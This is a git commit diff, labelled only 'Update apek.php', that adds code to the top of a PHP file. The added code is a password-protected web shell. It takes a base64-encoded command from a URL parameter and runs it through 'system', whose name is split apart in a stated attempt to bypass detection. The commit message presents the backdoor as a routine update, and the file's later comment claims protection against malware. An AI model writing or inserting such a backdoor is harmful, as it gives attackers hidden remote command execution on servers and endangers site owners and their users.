90cd182863d0cf710e474ec8bb773d1c3fe231ae
parbada <goodtogel207@gmail.com>
2025-07-14 04:27:09 +0700

    Update apek.php

--- apek.php
+++ apek.php
@@ -1,4 +1,25 @@
 <?php
+$auth_pass = "darell";
+$kunci = "cmd";
+
+// Bypass fungsi `system`
+$fnc = 's' . 'ys' . 'tem';
+
+// Cek password
+if (isset($_GET['pass']) && $_GET['pass'] === $auth_pass) {
+    // Cek command base64
+    if (isset($_GET[$kunci])) {
+        $cmd = base64_decode($_GET[$kunci]);
+        header("Content-Type: text/plain");
+        $fnc($cmd);
+    } else {
+        echo "Perintah tidak ditemukan.";
+    }
+} else
+?>
+
+
+<?php
 
 // Mengindari dari virus malware
 // Fungsi untuk mendapatkan konten menggunakan cURL
